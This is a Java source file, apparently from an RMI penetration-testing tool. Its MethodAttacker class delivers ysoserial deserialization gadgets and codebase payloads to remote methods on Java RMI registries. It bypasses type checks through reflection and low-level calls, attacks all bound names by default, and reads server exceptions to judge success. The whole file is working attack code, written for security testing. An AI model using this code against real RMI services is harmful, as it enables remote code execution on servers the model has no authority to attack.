package de.qtc.rmg.operations;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.networking.RMIWhisperer;
import de.qtc.rmg.utils.RMGUtils;
import javassist.CannotCompileException;
import javassist.NotFoundException;

/**
 * The method attacker is used to invoke RMI methods on the application level with user controlled
 * objects as method arguments. It can be used to attempt codebase and deserialization attacks on
 * known remote methods. Usually, you use first the *guess* operation to enumerate remote methods and
 * then you use the *method* operation to check them for codebase and deserialization vulnerabilities.
 *
 * The MethodAttacker was one of the first operation classes in rmg and is therefore not fully optimized
 * to the currently available other utility classes. It may be restructured in future.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class MethodAttacker {

    private RMIWhisperer rmi;
    private HashMap<String,String> classes;
    private MethodCandidate targetMethod;

    private Field proxyField;
    private Field remoteField;

    /**
     * The MethodAttacker makes use of the official RMI api to obtain the RemoteObject from the RMI registry.
     * Afterwards, it needs access to the underlying UnicastRemoteRef to perform customized RMi calls. Depending
     * on the RMI version of the server (current proxy approach or legacy stub objects), this requires access to
     * a different field within the Proxy or RemoteObject class. Both fields are made accessible within the constructor
     * to make the actual attacking code more clean.
     *
     * @param rmiRegistry registry to perform lookup operations
     * @param classes list of unknown classes per bound name
     * @param targetMethod the remote method to target
     */
    public MethodAttacker(RMIWhisperer rmiRegistry, HashMap<String,String> classes, MethodCandidate targetMethod)
    {
        this.rmi = rmiRegistry;
        this.classes = classes;
        this.targetMethod = targetMethod;

        try {
            this.proxyField = Proxy.class.getDeclaredField("h");
            this.remoteField = RemoteObject.class.getDeclaredField("ref");
            proxyField.setAccessible(true);
            remoteField.setAccessible(true);

        } catch(NoSuchFieldException | SecurityException e) {
            ExceptionHandler.unexpectedException(e, "MethodAttacker", "instantiation", true);
        }
    }

    /**
     * This lengthy method performs the actual method call. If no bound name was specified, it iterates
     * over all available bound names on the registry. After some initialization, the function checks the
     * specified MethodCandidate for non primitive arguments and determines whether the remote endpoint
     * uses legacy stubs. Non primitive arguments are required for codebase and deserialization attacks,
     * whereas the legacy status of the server is required to decide whether to create the remote classes
     * as interface or stub classes on the client side. Within legacy RMI, stub classes are required on the
     * client side, but current RMI implementations only need an interface that is assigned to a Proxy.
     *
     * Depending on the determined legacy status, an interface or legacy stub class is now created dynamically.
     * With the corresponding class now available on the class path, the RemoteObject can be looked up on the
     * registry. From the obtained object, the RemoteRef is then extracted by using reflection. With this remote
     * reference, a customized RMI call can now be dispatched.
     *
     * This low level RMI access is required to call methods with invalid argument types. During deserialization
     * attacks you may want to call a method that expects a HashMap with some other serialized object. When using
     * ordinary RMI to make the call, Java would refuse to use anything other than a HashMap during the call, as
     * it would violate the interface definition. With low level RMI access, the call arguments can be manually
     * written to the stream which allows to use arbitrary arguments for the call.
     *
     * @param gadget object to use during the RMI call. Usually a payload object created by ysoserial
     * @param boundName optional bound name to target. If null, target all bound names
     * @param argumentPosition specify the argument position to attack. If negative, automatically search for non primitive
     * @param operationMode the function was upgraded to support two operations 'codebase' or 'attack'
     * @param legacyMode whether to enforce legacy stubs. 0 -> auto, 1 -> enforce legacy, 2 -> enforce normal
     */
    @SuppressWarnings({ "rawtypes", "deprecation" })
    public void attack(Object gadget, String boundName, int argumentPosition, String operationMode, int legacyMode)
    {
        String methodName = "";
        boolean isCodebaseCall = operationMode.equals("codebase");

        try {
            methodName = this.targetMethod.getName();
        } catch (CannotCompileException | NotFoundException e) {
            ExceptionHandler.unexpectedException(e, "compliation", "process", true);
        }

        if(isCodebaseCall)
            Logger.printCodebaseAttackIntro("RMI", methodName, gadget.getClass().getName());
        else
            Logger.printGadgetCallIntro("RMI");

        if( boundName != null )
            Logger.printlnMixedBlue("Target name specified. Only attacking bound name:", boundName);
        else
            Logger.printlnMixedBlue("No target name specified. Attacking", "all", "available bound names.");

        Logger.println("");

        Iterator<Entry<String, String>> it = this.classes.entrySet().iterator();
        while (it.hasNext()) {

            Map.Entry pair = (Map.Entry)it.next();
            String name = (String)pair.getKey();
            String className = (String)pair.getValue();

            if( boundName != null && !boundName.equals(name) ) {
                continue;
            }

            Logger.printlnMixedYellow("Current bound name:", name);
            Logger.increaseIndent();

            int attackArgument = 0;
            try {
                attackArgument = this.targetMethod.getPrimitive(argumentPosition);
            } catch (CannotCompileException | NotFoundException e) {
                ExceptionHandler.unexpectedException(e, "search", "for primitive types", true);
            }

            if( attackArgument == -1 ) {

                if( argumentPosition == -1 )
                    Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", this.targetMethod.getSignature());

                RMGUtils.exit();
            }

            Logger.printlnMixedYellow("Found non primitive argument type on position", String.valueOf(attackArgument));
            boolean isLegacy = RMGUtils.isLegacy(className, legacyMode, true);

            Remote instance = null;
            Class remoteClass = null;
            RemoteRef remoteRef = null;

            try {

                if( !isLegacy )
                    remoteClass = RMGUtils.makeInterface(className, this.targetMethod);

                else
                    remoteClass = RMGUtils.makeLegacyStub(className, this.targetMethod);

            } catch(CannotCompileException e) {
                ExceptionHandler.cannotCompile(e, "interface", "creation", false);
                Logger.decreaseIndent();
                continue;
            }

            try {
                instance = rmi.getRegistry().lookup(name);

                if( !isLegacy ) {
                    RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
                    remoteRef = ref.getRef();

                } else {
                    remoteRef = (RemoteRef)remoteField.get(instance);
                }

            } catch( Exception e ) {
                ExceptionHandler.unexpectedException(e, "lookup", "call", false);
                Logger.decreaseIndent();
                continue;
            }

            Method[] allMethods = remoteClass.getDeclaredMethods();
            Method attackMethod = allMethods[0];
            Object[] methodArguments = RMGUtils.getArgumentArray(attackMethod);

            Object[] payloadArray = new Object[2];
            Object randomInstance = null;

            try {
                Class randomClass = RMGUtils.makeRandomClass();
                randomInstance = randomClass.newInstance();

            } catch (Exception e) {
                ExceptionHandler.unexpectedException(e, "random class", "creation", false);
                Logger.decreaseIndent();
                continue;
            }

            payloadArray[0] = gadget;
            payloadArray[1] = randomInstance;
            methodArguments[attackArgument] = payloadArray;

            try {
                Logger.println("Invoking remote method...");
                Logger.println("");
                Logger.increaseIndent();

                rmi.genericCall(null, -1, this.targetMethod.getHash(), methodArguments, isCodebaseCall, methodName, remoteRef);

                Logger.eprintln("Remote method invocation didn't cause any exception.");
                Logger.eprintln("This is unusual and the attack probably didn't work.");

            } catch (java.rmi.ServerException e) {

                Throwable cause = ExceptionHandler.getCause(e);
                if( cause instanceof java.rmi.UnmarshalException ) {
                    Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
                    ExceptionHandler.showStackTrace(e);
                    continue;

                } else if( cause instanceof java.lang.ClassNotFoundException ) {

                    String exceptionMessage = e.getMessage();
                    String randomClassName = randomInstance.getClass().getName();

                    if( operationMode.equals("ysoserial") ) {

                        if( exceptionMessage.contains(randomClassName) ) {
                            ExceptionHandler.deserializeClassNotFoundRandom(e, "deserialization", "attack", randomClassName);

                        } else {
                            ExceptionHandler.deserializeClassNotFound(e);
                        }
                    }

                    else if( operationMode.equals("codebase") ) {

                        if( exceptionMessage.contains("RMI class loader disabled") ) {
                            ExceptionHandler.codebaseSecurityManager(e);
                        }

                        else if( exceptionMessage.contains(gadget.getClass().getName()) ) {
                            ExceptionHandler.codebaseClassNotFound(e, gadget.getClass().getName());
                        }

                        else if( exceptionMessage.contains(randomClassName) ) {
                            ExceptionHandler.codebaseClassNotFoundRandom(e, randomClassName, gadget.getClass().getName());

                        } else {
                            ExceptionHandler.unexpectedException(e, "codebase", "attack", false);
                        }
                    }

                } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                    ExceptionHandler.unsupportedClassVersion(e, operationMode, "attack");

                } else if( cause instanceof java.security.AccessControlException ) {
                    ExceptionHandler.accessControl(e, operationMode, "attack");

                } else {
                    ExceptionHandler.unexpectedException(e, operationMode, "attack", false);
                }

            } catch( java.lang.ClassCastException e ) {

                if( operationMode.equals("ysoserial") )
                    ExceptionHandler.deserlializeClassCast(e, true);
                else
                    ExceptionHandler.codebaseClassCast(e, true);

            } catch( java.security.AccessControlException e ) {
                ExceptionHandler.accessControl(e, operationMode, "attack");

            } catch( java.rmi.UnmarshalException e ) {

                Throwable t = ExceptionHandler.getCause(e);
                if( t instanceof java.lang.ClassNotFoundException ) {
                    Logger.eprintlnMixedYellow("Caught local", "ClassNotFoundException", "during " + operationMode + " attack.");
                    Logger.eprintlnMixedBlue("This usually occurs when the", "gadget caused an exception", "on the server side.");
                    Logger.printlnMixedYellow("You probably entered entered an", "invalid command", "for the gadget.");
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, operationMode, "attack", false);
                }

            } catch( Exception e ) {

                if(operationMode.equals("ysoserial"))
                    ExceptionHandler.unknownDeserializationException(e);
                else
                    ExceptionHandler.unexpectedException(e, operationMode, "attack", false);

            } finally {
                Logger.decreaseIndent();
                Logger.decreaseIndent();

                if(it.hasNext())
                    Logger.println("");
            }
        }
    }
}
